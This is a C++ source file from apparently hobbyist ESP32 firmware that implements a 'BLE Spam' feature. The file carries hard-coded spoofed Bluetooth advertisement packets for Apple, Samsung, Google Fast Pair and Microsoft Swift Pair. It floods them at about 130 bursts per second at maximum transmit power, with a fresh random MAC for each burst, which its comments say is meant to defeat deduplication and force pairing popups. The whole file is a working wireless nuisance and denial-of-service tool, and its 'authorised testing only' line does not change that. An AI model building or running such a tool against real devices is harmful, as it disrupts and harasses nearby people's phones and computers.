// blespam.cpp — unified BLE advertisement spam (all types in one, terminal UI)
// Part of DIVV2-CUSTOMFIRMWARE-PCB (DEMRCAN2)
//
// Pick a mode (Apple iOS popups / Samsung / Google Fast Pair / Microsoft Swift
// Pair / All) from a ProtoKill-style selector, then flood BLE advertisements.
// Your own devices / authorised testing only.

#include "config.h"
#include "icon.h"
#include <NimBLEDevice.h>

// low-level NimBLE host call: set a fresh random advertising address (MAC)
extern "C" int ble_hs_id_set_rnd(const uint8_t *rnd_addr);

namespace BleSpam {

#define C_BG   BLACK
#define C_TXT  UI_TEXT
#define C_GRN  GREEN
#define C_ORA  ORANGE
#define C_GRY  GRAY
#define BS_BAR2 0x2104
#define BS_HDR_Y 44
#define BS_TOP   62
#define BS_LH    12

static inline void bsFont() { tft.setTextFont(1); tft.setTextSize(1); }
static int bsBottom() { return featureHasTouchNavBar() ? touchNavContentBottomY() : 320; }
static void bsNav(const char* l, const char* d, const char* c, const char* u, const char* r) {
  setTouchNavLabels(l, d, c, u, r); redrawTouchButtonBar();
}
static void header(const char* t) {
  featureClearContent(C_BG);
  drawStatusBar(readBatteryVoltage(), true, false);
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.fillRect(0, 20, 240, 16, BS_BAR2);
  tft.drawBitmap(10, 20, bitmap_icon_go_back, 16, 16, C_TXT);
  bsFont();
  tft.setTextColor(C_GRN, C_BG);
  tft.setCursor(6, BS_HDR_Y);
  tft.print(t);
}

// ───────── packet data ─────────
static const uint8_t APPLE[][31] = {
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x03,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0b,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x10,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x05,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x06,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x09,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x17,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
};
static const int APPLE_N = 17;
// Apple "Nearby Action" action types -> varied popups (Setup New iPhone, Apple TV,
// HomePod, Transfer Number, Apple Pay, Vision Pro, etc.)
static const uint8_t APPLE_ACTIONS[] = {
  0x13,0x27,0x20,0x09,0x02,0x1e,0x2b,0x2d,0x2f,0x01,0x06,0x0b,0x23,0x0d,0x05,0x04
};
static const int APPLE_ACTIONS_N = 16;
static const uint8_t SAMSUNG_TPL[15] = {14,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43,0x00};
static const uint8_t SAMSUNG_M[3]    = {0x01,0x02,0x03};
static const uint8_t GOOGLE_TPL[14]  = {0x03,0x03,0x2C,0xFE,0x06,0x16,0x2C,0xFE,0x00,0xB7,0x27,0x02,0x0A,0x00};
// known Fast Pair model IDs that trigger a pairing popup (3 bytes each)
static const uint8_t GOOGLE_IDS[][3] = {
  {0x00,0xB7,0x27},{0xCD,0x82,0x56},{0x92,0xBB,0xBD},{0x82,0x1F,0x66},
  {0x2D,0x7A,0x23},{0x00,0x00,0xF0},{0xF5,0x25,0x56},{0x71,0x8F,0xA4},
};
static const int GOOGLE_IDS_N = 8;

enum { M_APPLE, M_SAMSUNG, M_GOOGLE, M_MS, M_ALL, M_COUNT };
static const char* MODE_NAME[M_COUNT] = {"Apple iOS", "Samsung", "Google", "Microsoft", "All (rotate)"};
static const char* MODE_DESC[M_COUNT] = {"iOS pairing popups", "Galaxy buds/watch",
                                         "Fast Pair popups", "Swift Pair popups", "cycle every type"};

// ───────── state ─────────
enum State { ST_MENU, ST_SPAM };
static State st = ST_MENU;
static int   sel = 0, mode = 0, idx = 0;
static NimBLEAdvertising* adv = nullptr;
static bool  advCfg = false;
static volatile uint32_t txCount = 0;
static uint32_t lastTx = 0, lastDraw = 0;

// background turbo task: floods advertisements on the 2nd core, flat out
static volatile bool spamRunning = false;
static TaskHandle_t   spamTaskH  = nullptr;

// flowing log (white text)
static const int LOGMAX = 12;
static String   logBuf[LOGMAX];
static int      logN = 0;
static void logAdd(const String& s) {
  if (logN < LOGMAX) logBuf[logN++] = s;
  else { for (int i = 0; i < LOGMAX - 1; i++) logBuf[i] = logBuf[i + 1]; logBuf[LOGMAX - 1] = s; }
}

// ───────── advertising ─────────
static NimBLEAdvertisementData buildAdv(int m, int i) {
  NimBLEAdvertisementData d;
  if (m == M_APPLE) {
    if (i & 1) {                                   // alternate: Nearby Action popups
      uint8_t action = APPLE_ACTIONS[i % APPLE_ACTIONS_N];
      uint8_t r[11] = {0x0A, 0xFF, 0x4C, 0x00, 0x0F, 0x05,
                       (uint8_t)(0xC0 | (random(4))), action,
                       (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)};
      d.addData(std::string((const char*)r, 11));
    } else {                                       // proximity-pairing (AirPods-style) popups
      d.addData(std::string((const char*)APPLE[i % APPLE_N], 31));
    }
  } else if (m == M_SAMSUNG) {
    uint8_t r[15]; memcpy(r, SAMSUNG_TPL, 15); r[14] = SAMSUNG_M[i % 3];
    d.addData(std::string((const char*)r, 15));
  } else if (m == M_GOOGLE) {
    uint8_t r[14]; memcpy(r, GOOGLE_TPL, 14);
    const uint8_t* id = GOOGLE_IDS[i % GOOGLE_IDS_N];     // rotate real model IDs
    r[8] = id[0]; r[9] = id[1]; r[10] = id[2];
    r[13] = (uint8_t)(random(121) - 100);
    d.addData(std::string((const char*)r, 14));
  } else { // M_MS (Microsoft Swift Pair)
    uint8_t r[9] = {0x08, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80,
                    (uint8_t)random(256), (uint8_t)random(256)};
    d.addData(std::string((const char*)r, 9));
  }
  return d;
}

// fresh random MAC each burst -> defeats Apple/Google dedup -> forces popups
static void randomizeMac() {
  uint8_t m[6];
  for (int i = 0; i < 6; i++) m[i] = (uint8_t)random(256);
  m[5] |= 0xC0;                 // static random address (top two bits set)
  ble_hs_id_set_rnd(m);
}

// one advertisement burst (called from the background task)
static void spamBurst() {
  if (!adv) return;
  int m = (mode == M_ALL) ? (int)random(M_ALL) : mode;   // random real type when All
  adv->stop();                                           // must be stopped to re-address
  randomizeMac();
  NimBLEAdvertisementData d = buildAdv(m, idx);
  if (!advCfg) {
    adv->setMinInterval(0x20);
    adv->setMaxInterval(0x20);
    advCfg = true;
  }
  adv->setAdvertisementData(d);
  adv->start();
  txCount++;
  idx++;
}

static void spamTask(void*) {
  while (spamRunning) {
    spamBurst();
    vTaskDelay(pdMS_TO_TICKS(7));   // ~130 bursts/sec, flat out, off the UI core
  }
  spamTaskH = nullptr;
  vTaskDelete(nullptr);
}

// redraw the flowing log from the live counter (called from the UI loop)
static void drawSpamLog() {
  if (millis() - lastDraw < 160) return;
  lastDraw = millis();
  char l[40];
  snprintf(l, sizeof(l), "[+] tx %lu  %s", (unsigned long)txCount, MODE_NAME[mode]);
  logAdd(String(l));
  const int top = BS_TOP + BS_LH;
  tft.fillRect(0, top, 240, bsBottom() - top, C_BG);
  bsFont(); tft.setTextColor(C_TXT, C_BG);
  for (int i = 0; i < logN; i++) { tft.setCursor(5, top + i * BS_LH); tft.print(logBuf[i]); }
}

// ───────── screens ─────────
static void drawMenu() {
  header("BLE Spam");
  bsFont();
  tft.setTextColor(C_GRY, C_BG);
  tft.setCursor(5, BS_TOP); tft.print("[*] select spam mode:");
  for (int i = 0; i < M_COUNT; i++) {
    int y = BS_TOP + (i + 2) * BS_LH;
    bool s = (i == sel);
    tft.setTextColor(s ? C_ORA : C_TXT, C_BG);
    tft.setCursor(5, y);
    tft.print(s ? "[>] " : "[ ] "); tft.print(MODE_NAME[i]);
  }
  int dy = BS_TOP + (M_COUNT + 3) * BS_LH;
  tft.setTextColor(C_GRY, C_BG);
  tft.setCursor(5, dy); tft.print("[*] "); tft.print(MODE_DESC[sel]);
  bsNav(nullptr, "Down", "Exit", "Up", "Select");
}

static void stopSpam() {
  spamRunning = false;
  for (int i = 0; i < 50 && spamTaskH; i++) delay(5);   // let the task exit
  if (adv) adv->stop();
}

static void startSpam() {
  mode = sel; idx = 0; txCount = 0; logN = 0; advCfg = false; lastTx = 0; lastDraw = 0;
  adv = NimBLEDevice::getAdvertising();
  st = ST_SPAM;
  header(MODE_NAME[mode]);
  bsFont();
  tft.setTextColor(C_GRN, C_BG);
  tft.setCursor(5, BS_TOP); tft.print("[*] turbo spamming...");
  bsNav("Back", nullptr, "Exit", nullptr, nullptr);
  spamRunning = true;
  xTaskCreatePinnedToCore(spamTask, "blespam", 4096, nullptr, 1, &spamTaskH, 0);
}

// ───────── lifecycle ─────────
void setup() {
  st = ST_MENU; sel = 0;
  feature_exit_requested = false;
  setTouchButtonInputEnabled(true);
  NimBLEDevice::init("DIV");
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);          // max BLE TX power (range)
  randomizeMac();
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  drawMenu();
}

void loop() {
  maintainTouchNavBar();
  if (st == ST_MENU) {
    if (isButtonPressedEdge(BTN_UP))    { if (sel > 0) { sel--; drawMenu(); } }
    if (isButtonPressedEdge(BTN_DOWN))  { if (sel < M_COUNT - 1) { sel++; drawMenu(); } }
    if (isButtonPressedEdge(BTN_RIGHT)) { startSpam(); }
    if (isButtonPressedEdge(BTN_LEFT) || featureExitButtonPressed()) { feature_exit_requested = true; }
    delay(15);
  } else { // ST_SPAM
    drawSpamLog();
    if (isButtonPressedEdge(BTN_LEFT)) { stopSpam(); st = ST_MENU; sel = mode; drawMenu(); }
    if (featureExitButtonPressed())    { feature_exit_requested = true; }
    delay(15);
  }
}

void exit() {
  stopSpam();               // stop the background task + advertising
  st = ST_MENU;             // leave the NimBLE stack up (shared with other features)
}

} // namespace BleSpam
